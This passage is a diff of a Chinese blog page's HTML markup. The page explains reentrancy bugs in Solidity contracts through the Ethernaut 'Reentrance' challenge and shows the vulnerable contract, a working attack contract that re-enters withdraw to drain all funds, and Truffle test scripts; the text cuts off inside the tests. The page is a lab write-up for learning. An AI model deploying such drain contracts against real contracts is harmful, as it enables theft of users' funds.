-<p><code>victim智能合约</code>关键部分如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//账户存储的代币数量（用户账单）</span></div><div class="line">mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</div><div class="line"><span class="comment">//撤回钱，从账上化除</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) <span class="title">public</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</div><div class="line">        <span class="keyword">if</span>(msg.sender.call.value(_amount)()) &#123;</div><div class="line">            _amount;</div><div class="line">        &#125;</div><div class="line">        balances[msg.sender] -= _amount;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//收取钱，记账</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params">address _to</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</div><div class="line">  balances[_to] += msg.value;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="资产记录的修改在转币之后"><a href="#资产记录的修改在转币之后" class="headerlink" title="资产记录的修改在转币之后"></a>资产记录的修改在转币之后</h2><p>取<a href="https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488" target="_blank" rel="noopener">重入题目</a>部分，这更符合真实的场景，也引入重入攻击另一个重要的形成条件。</p>
+<p><code>victim智能合约</code>关键部分如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//账户存储的代币数量（用户账单）</span></span><br><span class="line">mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"><span class="comment">//撤回钱，从账上化除</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">        <span class="keyword">if</span>(msg.sender.call.value(_amount)()) &#123;</span><br><span class="line">            _amount;</span><br><span class="line">        &#125;</span><br><span class="line">        balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//收取钱，记账</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params">address _to</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">  balances[_to] += msg.value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>这是一个可以接受撤回代币的智能合约。其中有重入漏洞，可以导致一次调用withdraw，多于记录的钱。</p>
 <p>分析其流程：</p>
 <ul>
@@ -393,9 +225,9 @@
 </ul>
 <hr>
 
-<h1 id="ethernaut重入题"><a href="#ethernaut重入题" class="headerlink" title="ethernaut重入题"></a>ethernaut重入题</h1><p><a href="https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488" target="_blank" rel="external">重入题目</a></p>
-<h2 id="基于Remix"><a href="#基于Remix" class="headerlink" title="基于Remix"></a>基于Remix</h2><p><a href="http://remix.ethereum.org/#optimize=true&amp;version=soljson-v0.4.18+commit.9cf6e910.js" target="_blank" rel="external">Remix在线环境</a></p>
-<p>目标就是从智能合约中偷走全部的钱。<br>以下是目标智能合约代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</div><div class="line"><span class="comment">//合约</span></div><div class="line">contract Reentrance &#123;</div><div class="line">  <span class="comment">//账本</span></div><div class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</div><div class="line">  <span class="comment">//收钱记账</span></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params">address _to</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</div><div class="line">    balances[_to] += msg.value;</div><div class="line">  &#125;</div><div class="line">  <span class="comment">//查看账本</span></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _who</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> balances[_who];</div><div class="line">  &#125;</div><div class="line">  <span class="comment">//取钱销账</span></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) <span class="title">public</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</div><div class="line">      <span class="keyword">if</span>(msg.sender.call.value(_amount)()) &#123;</div><div class="line">        _amount;</div><div class="line">      &#125;</div><div class="line">      balances[msg.sender] -= _amount;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="comment">//fallback收钱函数</span></div><div class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="ethernaut重入题"><a href="#ethernaut重入题" class="headerlink" title="ethernaut重入题"></a>ethernaut重入题</h1><p><a href="https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488" target="_blank" rel="noopener">重入题目</a></p>
+<h2 id="基于Remix"><a href="#基于Remix" class="headerlink" title="基于Remix"></a>基于Remix</h2><p><a href="http://remix.ethereum.org/#optimize=true&amp;version=soljson-v0.4.18+commit.9cf6e910.js" target="_blank" rel="noopener">Remix在线环境</a></p>
+<p>目标就是从智能合约中偷走全部的钱。<br>以下是目标智能合约代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"><span class="comment">//合约</span></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  <span class="comment">//账本</span></span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line">  <span class="comment">//收钱记账</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params">address _to</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    balances[_to] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//查看账本</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _who</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//取钱销账</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      <span class="keyword">if</span>(msg.sender.call.value(_amount)()) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//fallback收钱函数</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>思路比较明显：</p>
 <ul>
 <li>先构造一个攻击合约</li>
@@ -424,7 +256,7 @@
 <p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fuud21cja7j30a0060743.jpg" alt="cr3.png"></p>
 <p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fuud24vl1oj30g8046wea.jpg" alt="cr4.png"></p>
 <p>number为重入次数，instance为受害者合约地址，另一个是攻击合约地址</p>
-<p>完全不知道原因，感觉原理也很底层，也就不深究了。<br>贴上攻击代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</div><div class="line"> </div><div class="line"> <span class="comment">//引入目标合约内容</span></div><div class="line"> contract Reentrance &#123;</div><div class="line"> </div><div class="line"><span class="comment">//.... 和上文一模一样的内容 ....</span></div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//自己的攻击合约</span></div><div class="line">contract MyContract &#123;</div><div class="line">    <span class="comment">//目标合约实例</span></div><div class="line">    Reentrance c;</div><div class="line">    <span class="comment">//合约拥有者</span></div><div class="line">    address owner;</div><div class="line">    <span class="comment">//进入payable fallback函数的次数</span></div><div class="line">    uint public number;</div><div class="line"></div><div class="line">    <span class="comment">//初始化函数</span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">MyContract</span>(<span class="params">address _c</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</div><div class="line">        <span class="comment">//链接至目标合约</span></div><div class="line">        c = Reentrance(_c);</div><div class="line">        <span class="comment">//确认合约所有者，用于最后取钱</span></div><div class="line">        owner = msg.sender;</div><div class="line">        <span class="comment">//直接完成donate步骤，在创建合约时，给一些钱</span></div><div class="line">        c.donate.value(msg.value)(<span class="keyword">this</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//payable fallback 函数</span></div><div class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</div><div class="line">        <span class="comment">//计数</span></div><div class="line">        number++;</div><div class="line">        <span class="comment">//不一定是donate金额的倍数，榨干每一点钱</span></div><div class="line">        uint weHave = c.balanceOf(<span class="keyword">this</span>);</div><div class="line">        <span class="keyword">if</span> (weHave &gt; c.balance) &#123;</div><div class="line">            <span class="keyword">if</span> (c.balance != <span class="number">0</span>) c.withdraw(c.balance);</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        c.withdraw(weHave);</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//调用withdraw，需要两次以上的调用，目前不知道原因</span></div><div class="line">    <span class="comment">//此处参数可以为0。但是不意味着可以不donate。一次性转钱的最大值就是donate的金额</span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</div><div class="line">        c.withdraw(<span class="number">0</span>);</div><div class="line">        c.withdraw(<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//提取参数至合约拥有者</span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getmoney</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</div><div class="line">      owner.transfer(<span class="keyword">this</span>.balance);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>完全不知道原因，感觉原理也很底层，也就不深究了。<br>贴上攻击代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//引入目标合约内容</span></span><br><span class="line"> contract Reentrance &#123;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//.... 和上文一模一样的内容 ....</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自己的攻击合约</span></span><br><span class="line">contract MyContract &#123;</span><br><span class="line">    <span class="comment">//目标合约实例</span></span><br><span class="line">    Reentrance c;</span><br><span class="line">    <span class="comment">//合约拥有者</span></span><br><span class="line">    address owner;</span><br><span class="line">    <span class="comment">//进入payable fallback函数的次数</span></span><br><span class="line">    uint public number;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">MyContract</span>(<span class="params">address _c</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="comment">//链接至目标合约</span></span><br><span class="line">        c = Reentrance(_c);</span><br><span class="line">        <span class="comment">//确认合约所有者，用于最后取钱</span></span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        <span class="comment">//直接完成donate步骤，在创建合约时，给一些钱</span></span><br><span class="line">        c.donate.value(msg.value)(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//payable fallback 函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="comment">//计数</span></span><br><span class="line">        number++;</span><br><span class="line">        <span class="comment">//不一定是donate金额的倍数，榨干每一点钱</span></span><br><span class="line">        uint weHave = c.balanceOf(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">if</span> (weHave &gt; c.balance) &#123;</span><br><span class="line">            <span class="keyword">if</span> (c.balance != <span class="number">0</span>) c.withdraw(c.balance);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        c.withdraw(weHave);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//调用withdraw，需要两次以上的调用，目前不知道原因</span></span><br><span class="line">    <span class="comment">//此处参数可以为0。但是不意味着可以不donate。一次性转钱的最大值就是donate的金额</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        c.withdraw(<span class="number">0</span>);</span><br><span class="line">        c.withdraw(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//提取参数至合约拥有者</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getmoney</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">      owner.transfer(<span class="keyword">this</span>.balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>利用Remix的操作步骤</p>
 <p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fuud2btqddj30aa0660ss.jpg" alt="cr6.png"></p>
 <p>创建合约</p>
@@ -437,9 +269,9 @@
 <p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fuud2k3e27j311w0hwjuc.jpg" alt="cr5.png"></p>
 <p>提交</p>
 <h2 id="基于truffle-本地测试"><a href="#基于truffle-本地测试" class="headerlink" title="基于truffle 本地测试"></a>基于truffle 本地测试</h2><p>下面是利用 <code>truffle</code> + <code>ganache</code> 利用 <code>truffle test</code> 进行本地测试的代码。没有遇到Remix环境下的坑，不知道是链的问题，还是编译器的问题。记录一下过程。</p>
-<p>设置部署文件 <code>2_deploy_contracts.js</code>：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> Victim = artifacts.require(<span class="string">'./Victim.sol'</span>)</div><div class="line"><span class="keyword">const</span> Attacker = artifacts.require(<span class="string">'./Attacker.sol'</span>)</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">deployer</span>) </span>&#123;</div><div class="line">  deployer</div><div class="line">    .deploy(Victim)</div><div class="line">    .then(<span class="function"><span class="params">()</span> =&gt;</span></div><div class="line">      deployer.deploy(Attacker, Victim.address)</div><div class="line">    )</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>链接至ganache测试链，<code>truffle.js</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  <span class="comment">// See &lt;http://truffleframework.com/docs/advanced/configuration&gt;</span></div><div class="line">  <span class="comment">// to customize your Truffle configuration!</span></div><div class="line">  networks: &#123;</div><div class="line">    development: &#123;</div><div class="line">      <span class="comment">// host: "10.21.238.12",</span></div><div class="line">      <span class="comment">// port: 8545,</span></div><div class="line">      host: <span class="string">'localhost'</span>,</div><div class="line">      port: <span class="number">7545</span>,</div><div class="line">      network_id: <span class="string">"*"</span> <span class="comment">// Match any network id</span></div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
-<p><code>test.js</code>基于js的测试脚本：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> attacker = artifacts.require(<span class="string">"Attacker"</span>);</div><div class="line"><span class="keyword">const</span> victim = artifacts.require(<span class="string">"Victim"</span>);</div><div class="line"></div><div class="line">contract(<span class="string">'test'</span>, <span class="keyword">async</span> (accounts) =&gt; &#123;</div><div class="line">    it(<span class="string">"should put 10 in attacker"</span>, <span class="keyword">async</span> () =&gt; &#123;</div><div class="line">        <span class="keyword">let</span> instance_att = <span class="keyword">await</span> attacker.deployed();</div><div class="line">        acct1 = accounts[<span class="number">0</span>]</div><div class="line">        <span class="keyword">let</span> getBalance = web3.eth.getBalance;</div><div class="line">        <span class="keyword">let</span> options = &#123; <span class="attr">from</span>: acct1, <span class="attr">to</span>: attacker.address, <span class="attr">value</span>: <span class="number">20</span> &#125;</div><div class="line">        <span class="keyword">let</span> result= <span class="keyword">await</span> instance_att.donate.sendTransaction(options)</div><div class="line">        <span class="comment">// console.log(result);</span></div><div class="line">        <span class="built_in">console</span>.log(getBalance(attacker.address))</div><div class="line">        assert.equal(getBalance(attacker.address), <span class="number">20</span>);</div><div class="line">     &#125;),</div><div class="line">     it(<span class="string">"should put 100 in victim"</span>, <span class="keyword">async</span> () =&gt; &#123;</div><div class="line">        <span class="keyword">let</span> instance = <span class="keyword">await</span> victim.deployed();</div><div class="line">        acct1 = accounts[<span class="number">0</span>]</div><div class="line">        <span class="keyword">let</span> getBalance = web3.eth.getBalance;</div><div class="line">        <span class="keyword">let</span> options = &#123; <span class="attr">from</span>: acct1, <span class="attr">to</span>: victim.address, <span class="attr">value</span>: <span class="number">100</span> &#125;</div><div class="line">        <span class="keyword">let</span> result= web3.eth.sendTransaction(options)</div><div class="line">        <span class="comment">// console.log(result);</span></div><div class="line">        <span class="built_in">console</span>.log(getBalance(victim.address))</div><div class="line">        assert.equal(getBalance(victim.address), <span class="number">100</span>);</div><div class="line">     &#125;),</div><div class="line">    <span class="comment">//  it("show attacker and victim", async () =&gt; &#123;</span></div><div class="line">    <span class="comment">//     let getBalance = web3.eth.getBalance;</span></div><div class="line">    <span class="comment">//     console.log(getBalance(victim.address))</span></div><div class="line">    <span class="comment">//     console.log(getBalance(attacker.address))</span></div><div class="line">    <span class="comment">//     assert.equal(getBalance(victim.address), 100);</span></div><div class="line">    <span class="comment">//  &#125;),</span></div><div class="line">     it(<span class="string">"attack_ready (transfer 10)"</span>, <span class="keyword">async</span> () =&gt; &#123;</div><div class="line">        <span class="keyword">let</span> instance_att = <span class="keyword">await</span> attacker.deployed();</div><div class="line">        <span class="keyword">let</span> instance_vic = <span class="keyword">await</span> victim.deployed();</div><div class="line">        <span class="built_in">console</span>.log(attacker.address)</div><div class="line">        <span class="built_in">console</span>.log(accounts[<span class="number">0</span>])</div><div class="line">        <span class="keyword">let</span> getBalance = web3.eth.getBalance;</div><div class="line">        <span class="keyword">let</span> result = <span class="keyword">await</span> instance_att.transfer.sendTransaction(victim.address,<span class="number">10</span>)</div><div class="line">        <span class="keyword">let</span> result2 = <span class="keyword">await</span> instance_vic.balanceOf.call(attacker.address,&#123;<span class="attr">from</span>: attacker.address&#125;)</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfAttack in vic:"</span>+result2)</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfvictim:"</span>+getBalance(victim.address))</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfAttack:"</span>+getBalance(attacker.address))</div><div class="line">        assert.equal(getBalance(victim.address), <span class="number">110</span>);</div><div class="line">     &#125;),</div><div class="line">     it(<span class="string">"attack (get 20)"</span>, <span class="keyword">async</span> () =&gt; &#123;</div><div class="line">        <span class="keyword">let</span> instance_att = <span class="keyword">await</span> attacker.deployed();</div><div class="line">        <span class="keyword">let</span> instance_vic = <span class="keyword">await</span> victim.deployed();</div><div class="line"></div><div class="line">        <span class="keyword">let</span> getBalance = web3.eth.getBalance;</div><div class="line">        <span class="keyword">let</span> result = <span class="keyword">await</span> instance_att.attack()</div><div class="line"></div><div class="line">        <span class="keyword">let</span> result2 = <span class="keyword">await</span> instance_vic.balanceOf.call(attacker.address,&#123;<span class="attr">from</span>: attacker.address&#125;)</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfAttack in vic:"</span>+result2)</div><div class="line"></div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfvictim:"</span>+getBalance(victim.address))</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfAttack:"</span>+getBalance(attacker.address))</div><div class="line">        assert.equal(getBalance(victim.address), <span class="number">90</span>);</div><div class="line">     &#125;)</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p>
+<p>设置部署文件 <code>2_deploy_contracts.js</code>：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Victim = artifacts.require(<span class="string">'./Victim.sol'</span>)</span><br><span class="line"><span class="keyword">const</span> Attacker = artifacts.require(<span class="string">'./Attacker.sol'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">deployer</span>) </span>&#123;</span><br><span class="line">  deployer</span><br><span class="line">    .deploy(Victim)</span><br><span class="line">    .then(<span class="function"><span class="params">()</span> =&gt;</span></span><br><span class="line">      deployer.deploy(Attacker, Victim.address)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>链接至ganache测试链，<code>truffle.js</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">// See &lt;http://truffleframework.com/docs/advanced/configuration&gt;</span></span><br><span class="line">  <span class="comment">// to customize your Truffle configuration!</span></span><br><span class="line">  networks: &#123;</span><br><span class="line">    development: &#123;</span><br><span class="line">      <span class="comment">// host: "10.21.238.12",</span></span><br><span class="line">      <span class="comment">// port: 8545,</span></span><br><span class="line">      host: <span class="string">'localhost'</span>,</span><br><span class="line">      port: <span class="number">7545</span>,</span><br><span class="line">      network_id: <span class="string">"*"</span> <span class="comment">// Match any network id</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
+<p><code>test.js</code>基于js的测试脚本：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 